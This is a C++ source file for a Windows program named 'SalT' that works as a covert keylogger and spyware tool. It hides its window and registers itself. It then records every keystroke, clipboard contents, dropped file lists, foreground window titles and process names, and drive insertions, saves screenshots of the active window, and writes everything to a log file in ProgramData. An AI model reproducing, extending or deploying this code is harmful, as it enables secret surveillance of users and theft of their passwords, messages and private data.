// SalT.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "SalT.h"
#include <string>
#include <sstream>
#include <vector>
#include <map>
#include <signal.h>
#include "ImgMgmt.h"
#include "RegisterSelf.h"

#ifndef FLAGBIT

#define FLAGBIT(n) (1<<(n))
#define MASKBIT(u) (FLAGBIT(u)-1)
#define MASKBITS(u,l) (MASKBIT(u) ^ MASKBIT(l))
#define SET_FLAG(f,fb) (f)|=(fb)
#define UNSET_FLAG(f,fb) (f)&=~(fb)
#define SET_UNSET_FLAG(f,fb,s) (f)=(s)?((f)|(fb)):((f)&~(fb))
#define IS_FLAG_SET(f,fb) (((f)&(fb))!=0)

#define SET_FLAGBIT(f,fb) (f)|=FLAGBIT(fb)
#define UNSET_FLAGBIT(f,fb) (f)&=~FLAGBIT(fb)
#define SET_UNSET_FLAGBIT(f,fb,s) (f)=(s)?((f)|FLAGBIT(fb)):((f)&~FLAGBIT(fb))
#define IS_FLAGBIT_SET(f,fb) (((f)&FLAGBIT(fb))!=0)

#define DEFINE_FUNCTION_SET_FLAGBIT(f,fb) void Set##fb(bool bSet##fb=true) {SET_UNSET_FLAGBIT(f,fb,bSet##fb);}
#define DEFINE_FUNCTION_IS_FLAGBIT_SET(f,fb) bool Is##fb() const {return IS_FLAGBIT_SET(f,fb);}
#define DEFINE_FUNCTION_SET_GET_FLAGBIT(f,fb) DEFINE_FUNCTION_SET_FLAGBIT(f,fb)\
	DEFINE_FUNCTION_IS_FLAGBIT_SET(f,fb)

#define NUM_BITS(t) (sizeof(t)<<3)
#define MS_FLAGBIT(t) (FLAGBIT(NUM_BITS(t)-1))
#define MSN_FLAGBIT(t,n) (FLAGBIT(NUM_BITS(t)-((n)+1)))


#endif

typedef std::wstring tstring;
typedef std::wstringstream tstringstream;

template<typename Source, typename Target>
bool ChangeType(const Source &inSource, Target &outTarget)
{
	tstringstream interpreter;
	return interpreter << inSource && interpreter >> outTarget;
}

void TReplace(tstring& str, const tstring& oldStr, const tstring& newStr)
{
	size_t pos = 0;
	while ((pos = str.find(oldStr, pos)) != tstring::npos)
	{
		str.replace(pos, oldStr.length(), newStr);
		pos += newStr.length();
	}
}


tstring CurTimeStr()
{
	tstring timeStr;
	{
		SYSTEMTIME st = {0};
		GetLocalTime(&st);
		TCHAR strTime[256] = { 0 };
		GetDateFormatEx(_T(""), 0, &st, _T("dd-MM-yyyy"), strTime, ARRAYSIZE(strTime), NULL);
		timeStr = strTime;
		GetTimeFormatEx(_T(""), 0, &st, _T(" hh:mm:ss.{0} tt"), strTime, ARRAYSIZE(strTime));
		timeStr += strTime;
		tstring ms;
		ChangeType(st.wMilliseconds, ms);
		TReplace(timeStr, _T("{0}"), ms);
	}
	return timeStr;
}

std::string UnicodeToUTF8(const wchar_t *unicodeString)
{
	std::string sRet;
	if (unicodeString != NULL && unicodeString[0])
	{
		int len(lstrlen(unicodeString));
		int kMultiByteLength = WideCharToMultiByte(CP_UTF8, 0, unicodeString, -1, 0, 0, NULL, NULL);
		std::vector<char> vecChar(kMultiByteLength);
		if (WideCharToMultiByte(CP_UTF8, 0, unicodeString, -1, &vecChar[0], vecChar.size(), NULL, NULL))
		{
			sRet = &vecChar[0];
		}
	}
	return sRet;
}
std::wstring UTF8ToUnicode(const char *utf8String)
{
	std::wstring		sRet;
	if (utf8String != NULL && utf8String[0])
	{
		int	kAllocate = MultiByteToWideChar(CP_UTF8, 0, utf8String, -1, NULL, 0);
		if (kAllocate)
		{
			std::vector<wchar_t> vecWide(kAllocate);

			int kCopied = MultiByteToWideChar(CP_UTF8, 0, utf8String, -1, &vecWide[0], vecWide.size());
			if (kCopied)
			{
				sRet = &vecWide[0];
			}
		}
	}
	return sRet;
}

HANDLE ghFile(INVALID_HANDLE_VALUE);
DWORD lastFlushTime(0);

static void SeekTillChar(HANDLE hFile, char ch = '\n') {
	char readChar(0);
	bool bCompare(true);
	DWORD bytesRead(0);
	while (ReadFile(hFile, &readChar, sizeof(readChar), &bytesRead, NULL) && bytesRead > 0) {
		if ((readChar == ch) == bCompare) {
			if (bCompare)
				bCompare = false;
			else {
				SetFilePointer(hFile, -1, NULL, SEEK_CUR);
				break;
			}
		}
	}
}
tstring getTempFile(LPCTSTR filePath, LPCTSTR appendStr = _T(".tmp"))
{
	tstring outPath(filePath);
	outPath += appendStr;
	int count(0);
	while (PathFileExists(outPath.c_str())) {
		outPath = filePath;
		outPath += appendStr;
		tstring strC;
		ChangeType(++count, strC);
		outPath += strC;
		if (count == 0)
			break;
	}
	return outPath;
}
static void ReduceFileSize(LPCTSTR filePath, LONGLONG uMaxFileSize = 32*1024*1024)
{
	HANDLE hFile(CreateFile(filePath, GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
	if (hFile != INVALID_HANDLE_VALUE) {
		LARGE_INTEGER fileSize = { 0 };
		GetFileSizeEx(hFile, &fileSize);
		LONGLONG totalFieSize(uMaxFileSize << 1);
		if (fileSize.QuadPart > totalFieSize) {
			fileSize.QuadPart = -uMaxFileSize;
			SetFilePointerEx(hFile, fileSize, NULL, SEEK_END);
			SeekTillChar(hFile);
			tstring tempFile(getTempFile(filePath));
			HANDLE hFileDst(CreateFile(tempFile.c_str(), GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL));
			if (hFileDst != INVALID_HANDLE_VALUE) {
				char buffer[4096];
				DWORD bytesRead(0);
				while (ReadFile(hFile, buffer, ARRAYSIZE(buffer), &bytesRead, NULL) && bytesRead > 0)
					WriteFile(hFileDst, buffer, bytesRead, &bytesRead, NULL);
				CloseHandle(hFileDst);
				CloseHandle(hFile);
				hFile = INVALID_HANDLE_VALUE;
				DeleteFile(filePath);
				MoveFileEx(tempFile.c_str(), filePath, MOVEFILE_REPLACE_EXISTING);
				DeleteFile(tempFile.c_str());
			}
		}
		if (hFile != INVALID_HANDLE_VALUE)
			CloseHandle(hFile);
	}
}

DWORD OpenLogFile()
{
	if (ghFile == INVALID_HANDLE_VALUE || GetTickCount()-lastFlushTime > 60000) {
		lastFlushTime = GetTickCount();
		TCHAR filePath[MAX_PATH];
		if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_DEFAULT, filePath)))
			return GetLastError();
		PathAppend(filePath, _T("salt.in"));
		DWORD crDispo(CREATE_NEW);
		if (PathFileExists(filePath))
			crDispo = OPEN_EXISTING;
		if (ghFile != INVALID_HANDLE_VALUE) {
			CloseHandle(ghFile);
			ReduceFileSize(filePath);
		}
		ghFile = CreateFile(filePath, GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_READ, NULL, crDispo, FILE_ATTRIBUTE_NORMAL, NULL);
		if (ghFile == INVALID_HANDLE_VALUE)
			return GetLastError();
		SetFilePointer(ghFile, 0, 0, FILE_END);
	}
	return 0;
}


tstring tFormat(LPCTSTR msg, ...)
{
	tstring outStr;
	if (msg != NULL) {
		va_list arg;
		va_start(arg, msg);
		int len = _vsctprintf(msg, arg) + 4 * sizeof(TCHAR); // _vscprintf doesn't count + 1; terminating '\0'
		TCHAR *buf = new TCHAR[len];
		_vstprintf_s(buf, len, msg, arg);
		outStr = buf;
		delete buf;
	}
	return outStr;
}

class LogFlags {
public:
	LogFlags() : m_uFlags(0) {}
	DEFINE_FUNCTION_SET_GET_FLAGBIT(m_uFlags, DoNotLogTime)
	DEFINE_FUNCTION_SET_GET_FLAGBIT(m_uFlags, PrintNewLine)
    DEFINE_FUNCTION_SET_GET_FLAGBIT(m_uFlags, PrintWindowPointer)
private:
	enum Flags  {
		DoNotLogTime,
		PrintNewLine,
        PrintWindowPointer
	};
	UINT m_uFlags;
};
LogFlags gLogFlags;

void Log(LPCTSTR msg, ...)
{
	tstring outStr;// (tFormat(msg));
	if (msg != NULL) {
		va_list arg;
		va_start(arg, msg);
		int len = _vsctprintf(msg, arg) + 4 * sizeof(TCHAR); // _vscprintf doesn't count + 1; terminating '\0'
		TCHAR *buf = new TCHAR[len];
		_vstprintf_s(buf, len, msg, arg);
		outStr = buf;
		delete buf;
	}
	tstring logStr;
	if (!gLogFlags.IsDoNotLogTime()) {
		if (gLogFlags.IsPrintNewLine())
			logStr += _T("\n");
		logStr += CurTimeStr();
		logStr += _T(": ");
	}
	logStr += outStr;
	if (!gLogFlags.IsDoNotLogTime())
		logStr += _T("\n");
	gLogFlags.SetPrintNewLine(false);
	if (logStr.length() > 0 && logStr[logStr.length() - 1] != '\n')
		gLogFlags.SetPrintNewLine();
	TReplace(logStr, _T("\n"), _T("\r\n"));
	gLogFlags.SetDoNotLogTime(false);
	OpenLogFile();
	if (ghFile != INVALID_HANDLE_VALUE) {
		std::string utfStr(UnicodeToUTF8(logStr.c_str()));
		DWORD bytesWrite(utfStr.length());
		WriteFile(ghFile, utfStr.c_str(), bytesWrite, &bytesWrite, NULL);
	}
#ifdef _DEBUG
	OutputDebugString(logStr.c_str());
#endif // DEBUG
}

void SignalHandler(int signal)
{
	if (signal == SIGTERM) {
		// abort signal handler code
		CloseHandle(ghFile);
		ghFile = INVALID_HANDLE_VALUE;
	}
	else {
		// ...
	}
}
static void ProcessMessages() {
	MSG msg;
	if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

static bool GetFocusWindow(HWND &hFocusWnd)
{
    HWND hWndFocus(hFocusWnd);
	while (1) {
		HWND hCurFocus(GetForegroundWindow());
		if (hWndFocus != hCurFocus) {
			hWndFocus = hCurFocus;
			ProcessMessages();
			Sleep(500);
		}
		else
			break;
	}
    bool bFocusChanged(hFocusWnd != hWndFocus);
    hFocusWnd = hWndFocus;
	return bFocusChanged;
}

static tstring GetWindowProcessName(HWND hWnd)
{
    DWORD pid(0);
    GetWindowThreadProcessId(hWnd, &pid);
    Path processName;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess != NULL) {
        TCHAR processImageName[1024] = { 0 };
        GetProcessImageFileName(hProcess, processImageName, _countof(processImageName));
        CloseHandle(hProcess);
        processName = processImageName;
    }
    return processName.FileNameWithoutExt();
}
static tstring WindowTitle(HWND hWnd)
{
    TCHAR wndText[256] = { 0 };
    GetWindowText(hWnd, wndText, ARRAYSIZE(wndText));
    return wndText;
}
static void LogWindow(HWND hWndFocus, LPCTSTR msg = _T("Window"))
{
    tstring title(WindowTitle(hWndFocus));
    TCHAR className[256] = { 0 };
    GetClassName(hWndFocus, className, ARRAYSIZE(className));
    tstring procName(GetWindowProcessName(hWndFocus));
    tstring wndPtr;
    if (gLogFlags.IsPrintWindowPointer())
        wndPtr = tFormat(_T(" :0x%X"), hWndFocus);
    gLogFlags.SetDoNotLogTime(false);
    Log(_T("%s: %s: %s:%s%s"), msg, title.c_str(), procName.c_str(), className, wndPtr.c_str());
}
static bool AttachFocusWindow(HWND &hWndFocus, DWORD &prevFocusThreadID)
{
	static tstring frontText;
	bool bRet(GetFocusWindow(hWndFocus));
	if (bRet) {
		bRet = false;
		LogWindow(hWndFocus, _T("Front"));
        frontText = WindowTitle(hWndFocus);
		DWORD focusThreadID(GetWindowThreadProcessId(hWndFocus, NULL));
		if (prevFocusThreadID != focusThreadID) {
			DWORD currentThreadID(GetCurrentThreadId());
			AttachThreadInput(currentThreadID, prevFocusThreadID, FALSE);
			prevFocusThreadID = focusThreadID;
			bRet = AttachThreadInput(currentThreadID, focusThreadID, TRUE) == TRUE;
		}
	}
	else {
        tstring text(WindowTitle(hWndFocus));
		if (text != frontText) {
			frontText = text;
            LogWindow(hWndFocus, _T("Front Title"));
			bRet = true;
		}
	}
	return bRet;
}
#define MAP_UINT_STR_ADD(m,d) m[d]=_T(#d)

static lstring GetClipboardFormatStr(UINT uFormat)
{
	static std::map<UINT, lstring> sFormatData;
	if (sFormatData.size() == 0) {
		MAP_UINT_STR_ADD(sFormatData, CF_TEXT);
		MAP_UINT_STR_ADD(sFormatData, CF_TEXT);
		MAP_UINT_STR_ADD(sFormatData, CF_BITMAP);
		MAP_UINT_STR_ADD(sFormatData, CF_METAFILEPICT);
		MAP_UINT_STR_ADD(sFormatData, CF_SYLK);
		MAP_UINT_STR_ADD(sFormatData, CF_DIF);
		MAP_UINT_STR_ADD(sFormatData, CF_TIFF);
		MAP_UINT_STR_ADD(sFormatData, CF_OEMTEXT);
		MAP_UINT_STR_ADD(sFormatData, CF_DIB);
		MAP_UINT_STR_ADD(sFormatData, CF_PALETTE);
		MAP_UINT_STR_ADD(sFormatData, CF_PENDATA);
		MAP_UINT_STR_ADD(sFormatData, CF_RIFF);
		MAP_UINT_STR_ADD(sFormatData, CF_WAVE);
		MAP_UINT_STR_ADD(sFormatData, CF_UNICODETEXT);
		MAP_UINT_STR_ADD(sFormatData, CF_ENHMETAFILE);
		MAP_UINT_STR_ADD(sFormatData, CF_HDROP);
		MAP_UINT_STR_ADD(sFormatData, CF_LOCALE);
		MAP_UINT_STR_ADD(sFormatData, CF_DIBV5);
		MAP_UINT_STR_ADD(sFormatData, CF_MAX);
		MAP_UINT_STR_ADD(sFormatData, CF_OWNERDISPLAY);
		MAP_UINT_STR_ADD(sFormatData, CF_DSPTEXT);
		MAP_UINT_STR_ADD(sFormatData, CF_DSPBITMAP);
		MAP_UINT_STR_ADD(sFormatData, CF_DSPMETAFILEPICT);
		MAP_UINT_STR_ADD(sFormatData, CF_DSPENHMETAFILE);
	}
	lstring outStr;
	auto cit(sFormatData.find(uFormat));
	if (cit != sFormatData.end())
		outStr = cit->second;
	return outStr;
}
static void* getDropFilesListSize(LPDROPFILES pDF, int &outSize)
{
	outSize = 0;
	void *outData = NULL;
	if (pDF != NULL) {
		__try {
			LPCTSTR pFile = (LPCTSTR)(((LPBYTE)pDF) + pDF->pFiles);
			while (*pFile) {
				int len(lstrlen(pFile)+1);
				outSize += len;
				pFile += len;
			}
			if (outSize > 0) {
				++outSize;
				outData = malloc(outSize*sizeof(TCHAR));
				memcpy(outData, ((LPBYTE)pDF) + pDF->pFiles, outSize);
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {

		}
	}
	return outData;
}
lstring getDropFilesList(LPDROPFILES pDF)
{
	lstring files;
	if (pDF != NULL) {
		int size(0);
		LPCTSTR pFile = (LPCTSTR)getDropFilesListSize(pDF, size);
		if (pFile != NULL) {
			void *orgData((void*)pFile);
			while (*pFile) {
				if (!files.empty())
					files += _T("\n\t");
				files += pFile;
				pFile += lstrlen(pFile) + 1;
			}
			free(orgData);
		}
	}
	return files;
}
static void LogClipBoardData(HWND hWnd)
{
	if (OpenClipboard(hWnd)) {
		HGLOBAL hGlb = GetClipboardData(CF_UNICODETEXT);
		bool isUniCode = hGlb != NULL;
		bool bHandled(false);
		if (!isUniCode)
			hGlb = GetClipboardData(CF_TEXT);
		if (hGlb != NULL) {
			LPTSTR textStr = (LPTSTR)GlobalLock(hGlb);
			if (textStr != NULL) {
				lstring strText(textStr);
				if (!isUniCode)
					strText = UTF8ToUnicode((const char *)textStr);
				GlobalUnlock(hGlb);
				Log(_T("Clipboard String: %s\n"), strText.c_str());
			}
			bHandled = true;
		}
		if (!bHandled) {
			hGlb = GetClipboardData(CF_HDROP);
			if (hGlb != NULL) {
				LPDROPFILES pDF((LPDROPFILES)GlobalLock(hGlb));
				if (pDF != NULL) {
					lstring files;
					//__try {
					LPCTSTR pFile = (LPCTSTR)(((LPBYTE)pDF) + pDF->pFiles);
					while (*pFile) {
						if (!files.empty())
							files += _T("\n\t");
						files += pFile;
						pFile += lstrlen(pFile) + 1;
					}
					//}
					//__except (EXCEPTION_EXECUTE_HANDLER) {

					//}
					GlobalUnlock(hGlb);
					Log(_T("Clipboard Files: %s\n"), files.c_str());
				}
				bHandled = true;
			}
		}
		if (!bHandled) {
			UINT uFormat = 0;
			lstring clipFormats;
			while (uFormat = EnumClipboardFormats(uFormat)) {
				lstring cf(GetClipboardFormatStr(uFormat));
				if (!cf.empty()) {
					if (!clipFormats.empty())
						clipFormats += _T(",");
					clipFormats += cf;
				}
			}
			Log(_T("Clipboard Formats: %s\n"), clipFormats.c_str());
		}
		CloseClipboard();
	}
}
static lstring FirstDriveFromMask(ULONG unitmask, int *startPos = NULL)
{
	int i = startPos ? *startPos : 0;
	for (; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	if (startPos)
		*startPos = i + 1;
	TCHAR drive[] = { (TCHAR)(i + 'A'), ':', (TCHAR)0 };
	return lstring(drive);
}
static INT_PTR CALLBACK DialogProc_Help(
	_In_  HWND hwndDlg,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
	)
{
	switch (uMsg)
	{
	case WM_INITDIALOG:
		SetWindowText(hwndDlg, _T("com.xyz.SalT"));
		ShowWindow(hwndDlg, SW_HIDE);
		AddClipboardFormatListener(hwndDlg);
		break;
	case WM_CLIPBOARDUPDATE:
		LogClipBoardData(hwndDlg);
		break;
	case WM_DEVICECHANGE:
		{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
		switch (wParam)
		{
		case DBT_DEVICEARRIVAL:
			// Check whether a CD or DVD was inserted into a drive.
			if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
			{
				PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
				lstring drive = FirstDriveFromMask(lpdbv->dbcv_unitmask);
				Log(_T("Drive: '%s' arrived"), drive.c_str());
			}
			break;

		case DBT_DEVICEREMOVECOMPLETE:
			// Check whether a CD or DVD was removed from a drive.
			if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
			{
				PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
				lstring drive = FirstDriveFromMask(lpdbv->dbcv_unitmask);
				Log(_T("Drive: '%s' removed"), drive.c_str());
			}
			break;
		}
		}
		break;
	}
	return FALSE;
}



int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	int retVal(CRegisterSelf().Register());
	if (retVal)
		return retVal;
	Log(_T("Session Starts:"));
	HWND hndHelp = CreateDialog(hInstance, MAKEINTRESOURCE(IDD_ABOUTBOX), NULL, DialogProc_Help);
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	LogClipBoardData(hndHelp);
	signal(SIGTERM, SignalHandler);
	HWND hWndFocus(NULL);
	
	DWORD lastKeyTime[256] = { 0 };
	DWORD prevFocusThreadID(-1);
	bool bMinimal(true);

    if (!bMinimal)
        gLogFlags.SetPrintWindowPointer();
	while (1) {
		BYTE keyState[256] = {0};
		int iSaveWndImage(0);
		if (AttachFocusWindow(hWndFocus, prevFocusThreadID)) {
			++iSaveWndImage;
		}
		if (GetKeyboardState(keyState)) {
			DWORD tickCount(GetTickCount());
			for (int i = 0; i < ARRAYSIZE(keyState); ++i) {
				if (keyState[i] & 0xf0) { // key down
					// Pressed
					DWORD lastKTime(lastKeyTime[i]);
					lastKeyTime[i] = tickCount;
					if (tickCount - lastKTime > 100) {
						TCHAR chUniCode[256] = { 0 };
						ToUnicode(i, i, keyState, chUniCode, ARRAYSIZE(chUniCode), 0);
						if (bMinimal) {
							gLogFlags.SetDoNotLogTime();
							if (chUniCode[0]) {
								Log(_T("%s"), chUniCode);
							}
							else if (i == VK_LBUTTON && gLogFlags.IsPrintNewLine()) {
								Log(_T("\n"));
							}
							else if (i == VK_DELETE || i == VK_BACK)
								Log(_T("ß"));
							else if (i == VK_LEFT)
								Log(_T("«"));
							else if (i == VK_RIGHT)
								Log(_T("»"));
						}
						else
							Log(_T("UniCode=%s ScanCode=%d KeyState=%x"), chUniCode, i, keyState[i]);
						if (iSaveWndImage == 0)
							iSaveWndImage = 2;
					}
				}
				else
					lastKeyTime[i] = 0;
			}
		}
		if (iSaveWndImage)
			SaveHwndImage(hWndFocus, iSaveWndImage);
		ProcessMessages();
		Sleep(30);
	}
	Gdiplus::GdiplusShutdown(gdiplusToken);
	return retVal;
}
